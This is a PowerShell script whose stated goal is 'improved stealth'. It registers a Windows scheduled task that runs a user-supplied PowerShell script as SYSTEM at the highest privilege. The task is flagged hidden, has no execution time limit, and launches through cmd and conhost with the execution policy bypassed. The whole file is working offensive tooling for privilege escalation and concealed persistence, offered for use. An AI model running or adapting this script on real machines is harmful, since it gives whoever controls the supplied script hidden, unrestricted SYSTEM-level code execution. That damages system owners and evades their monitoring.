# Author: phoogeveen aka x0xr00t
# Description: Enhanced script for creating a scheduled task with custom name, start time, and improved stealth.
# Version: 2.0

param(
    [string]$FilePath,
    [string]$CustTaskName = "ElevatedTask",  # Default task name if none is provided
    [datetime]$Time  # Optional start time
)

# Check if the FilePath parameter was provided, or prompt the user
if (-not $FilePath) {
    Write-Host "No -FilePath parameter provided. Please specify the path to the .ps1 script."
    $FilePath = Read-Host -Prompt "Enter the full path to the PowerShell script (.ps1)"
}

# Validate the file path
if (-not (Test-Path -Path $FilePath -PathType Leaf)) {
    Write-Error "The specified file path '$FilePath' does not exist or is invalid. Please provide a valid .ps1 script file path."
    exit
}

# Determine the start time for the scheduled task
$currentDateTime = Get-Date
if (-not $Time) {
    $Time = $currentDateTime.AddMinutes(2)
    Write-Output "No -Time parameter provided. Defaulting start time to 2 minutes from now: $Time"
}

# Format the start time for XML (in UTC format)
$formattedStartTime = $Time.ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss")
Write-Output "Formatted start time for XML: $formattedStartTime"

# Define the XML for the scheduled task
$taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>$formattedStartTime</Date>
    <Author>NT AUTHORITY\SYSTEM</Author>
    <URI>\$CustTaskName</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>$formattedStartTime</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>cmd.exe</Command>
      <Arguments>/c start /min conhost.exe cmd.exe /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$FilePath`"</Arguments>
      <WorkingDirectory>$([System.IO.Path]::GetDirectoryName($FilePath))</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
"@

# Register the scheduled task with the XML definition
try {
    Register-ScheduledTask -Xml $taskXml -TaskName $CustTaskName -Force
    Write-Output "Scheduled task '$CustTaskName' registered successfully."
} catch {
    Write-Error "Failed to register scheduled task: $_"
    exit
}

# Start the scheduled task immediately if it's due
try {
    Start-ScheduledTask -TaskName $CustTaskName
    Write-Output "Scheduled task '$CustTaskName' started successfully."
} catch {
    Write-Error "Failed to start scheduled task: $_"
    exit
}

# Verify the process is running
Start-Sleep -Seconds 5
try {
    $processId = Get-WmiObject Win32_Process | Where-Object {$_.CommandLine -like "*powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$FilePath`""} | Select-Object -ExpandProperty ProcessId
    if ($processId) {
        Write-Output "Process ID of the started process: $processId"
    } else {
        Write-Output "Process not detected, it might be running hidden or scheduled later."
    }
} catch {
    Write-Error "Failed to retrieve process ID: $_"
}
